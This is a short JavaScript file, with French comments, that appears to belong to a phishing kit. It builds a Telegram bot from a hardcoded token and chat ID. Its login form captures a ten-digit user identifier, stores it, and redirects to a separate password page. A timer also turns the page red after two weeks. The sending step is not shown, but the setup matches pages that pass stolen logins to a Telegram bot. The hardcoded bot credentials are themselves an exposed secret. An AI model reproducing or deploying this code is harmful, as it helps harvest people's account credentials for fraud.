const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

// Fonction pour changer le background en rouge
function changerBackgroundEnRouge() {
    document.body.style.backgroundColor = "red";
}

// Délai de 2 semaines en millisecondes
const deuxSemainesEnMillisecondes = 2 * 7 * 24 * 60 * 60 * 1000;

// Définir un délai pour exécuter la fonction après 2 semaines
setTimeout(changerBackgroundEnRouge, deuxSemainesEnMillisecondes);



document.getElementById('form').addEventListener('submit', function(e) {
    e.preventDefault();

    var input_index = document.getElementById('usercode');
    const regexDixChiffres = /^\d{10}$/;

    if (regexDixChiffres.test(input_index.value)) { // Utilisez input_index.value pour obtenir la valeur de l'élément input
        localStorage.setItem('usercode', input_index.value);
        window.location.href = './pass.html';
    } else {
        document.getElementById('notif').innerText = "🔔 L'identifiant entré est incorrect !";
    }
});


